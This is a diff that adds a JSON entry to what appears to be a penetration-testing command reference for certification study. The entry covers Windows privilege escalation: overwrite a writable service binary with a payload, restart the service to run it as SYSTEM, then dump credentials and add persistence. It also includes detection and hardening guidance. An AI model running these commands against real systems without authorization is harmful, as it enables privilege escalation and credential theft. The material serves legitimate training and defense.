@@ -1,0 +1,98 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "icacls",
+    "sc"
+  ],
+  "tags": [
+    "weak-permissions",
+    "service",
+    "binary-hijack"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Weak Permissions",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Confirm write access to the service binary",
+      "command": "icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\""
+    },
+    {
+      "label": "Overwrite it with your payload",
+      "command": "cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\""
+    },
+    {
+      "label": "Start the service to execute",
+      "command": "sc start SecurityService"
+    },
+    {
+      "label": "OSCP Ch16 — list running services and binary paths (Get-CimInstance win32_service)",
+      "command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
+    },
+    {
+      "label": "OSCP Ch16 — check service startup type (Auto = executes on reboot)",
+      "command": "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}"
+    }
+  ],
+  "notes": "=== Weak Service Binary ACL — Service Binary Replacement ===\nOverly permissive ACLs on service binaries allow replacement with malicious executable → SYSTEM.\n\n=== DISCOVERY ===\nAutomated:\n  .\\SharpUp.exe audit ModifiableServiceBinaries\n  (also: PowerUp.ps1 → Invoke-AllChecks)\n\nManual verification with icacls:\n  icacls C:\\path\\to\\service.exe\n  Look for: Everyone:(F), BUILTIN\\Users:(W), NT AUTHORITY\\Authenticated Users:(W)\n  (F) = Full Control, (W) = Write, (M) = Modify — all exploitable\n\n=== ATTACK FLOW ===\n1. Identify vulnerable service binary (SharpUp or icacls)\n2. Back up original (optional — for client cleanup):\n   cp C:\\Vuln\\Service.exe C:\\Vuln\\Service.exe.bak\n3. Replace with malicious binary:\n   cp C:\\Tools\\shell.exe C:\\Vuln\\Service.exe\n4. Restart service:\n   sc stop VulnService\n   sc start VulnService\n   → Malicious binary executes as SYSTEM\n\n=== WHAT MAKES A BINARY \"VULNERABLE\" ===\nWrite access by low-privilege groups (Everyone, Users, Authenticated Users) on:\n- The service binary itself\n- The directory containing the service binary\n(Directory write = can rename original + place malicious file with same name)\n\n=== CHAINING CONTEXT ===\nWeak binary ACL → replace → SYSTEM shell → LSASS dump → domain escalation\nThird-party software (backup agents, monitoring tools) commonly misconfigured this way\nSharpUp finds this automatically — run it on every Windows foothold\nAfter SYSTEM: add admin user, deploy persistence, dump credentials\n\n=== WHAT TO LOOK FOR ===\nBUILTIN\\Users or Everyone with write access on anything in Program Files = automatic flag\nC:\\Windows binaries should never have user-writable ACLs — report immediately\nDirectory ACL vs file ACL: directory write allows name-substitution attack even without direct file write OSCP Ch16 workflow: Get-CimInstance win32_service → icacls on binary → replace if BUILTIN\\Users has (F) → reboot if Auto startup and no stop permission. PowerUp: Get-ModifiableServiceFile. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).",
+  "references": [
+    {
+      "title": "HackTricks - Windows Local Privilege Escalation",
+      "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 - Windows Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpup-audit",
+      "note": "Where the finding came from.",
+      "rel": "prereq"
+    },
+    {
+      "id": "weak-service-acl-binpath",
+      "note": "Reconfigure binPath if the binary isn't writable.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "weak-service-binary",
+  "name": "Weak Permissions - Replace Modifiable Service Binary",
+  "command": "cmd /c copy /Y payload.exe \"<writable_service_binary>\"",
+  "description": "When a service's executable is writable by your user, overwrite it with a payload and (re)start the service to run it as the service account (often SYSTEM). Keep a copy of the original to restore.",
+  "opsec": "loud",
+  "mitre": [
+    "T1574.010"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "If a service binary has write permissions for non-admin users (Everyone or BUILTIN\\Users), the attacker can replace the executable with a malicious binary. On next service start, the malicious binary executes in the service account's security context (often SYSTEM). icacls reveals the permission misconfiguration.",
+    "prerequisites": "A service binary with write access for non-admin users. Service must be restartable (directly or via system reboot). A replacement malicious binary.",
+    "impact": "Arbitrary code execution as the service account (SYSTEM or other privileged account) by replacing a writable service binary.",
+    "detection": "icacls or accesschk on service binaries by standard user. Modification of a service binary file by non-admin (File integrity monitoring, Event 4663). Service binary hash change. Sysmon Event 11: file created in protected service binary path.",
+    "artifacts": "File modification: service binary modified by non-admin (Event 4663) | Sysmon Event 11: file created in service binary directory | File integrity monitoring alert | Service restarted with new binary",
+    "prevention": "Enforce file permissions on all service binary directories — only SYSTEM and Administrators should have write access. Audit with accesschk and icacls during security reviews. Enable file integrity monitoring on service binary directories.",
+    "misconfiguration": "Application installer incorrectly sets service binary permissions to allow Everyone or Users write access. icacls shows: BUILTIN\\Users:(I)(F) or (W) on the service binary.",
+    "vulnerable_config": "# Writable service binary:\nicacls 'C:\\Program Files\\File Monitor\\filepermservice.exe'\n# BUILTIN\\Users:(I)(F) <- full write for all users!\n\n# Exploit:\ncopy malicious.exe 'C:\\Program Files\\File Monitor\\filepermservice.exe'\nsc stop FilePermSvc\nsc start FilePermSvc  # executes malicious.exe as SYSTEM",
+    "secure_config": "# Audit all service binary permissions:\nGet-WmiObject Win32_Service | ForEach-Object {\n    $path = $_.PathName -replace '\"',''\n    if (Test-Path $path) {\n        $acl = Get-Acl $path\n        $acl.Access | Where-Object {$_.IdentityReference -match 'Users|Everyone'}\n    }\n}\n\n# Fix permissive binary permissions:\nicacls 'C:\\Program Files\\File Monitor\\filepermservice.exe' /inheritance:r /grant 'SYSTEM:(F)' /grant 'Administrators:(F)'",
+    "sources": [
+      "HTB M26",
+      "MITRE T1574.010"
+    ]
+  }
+}
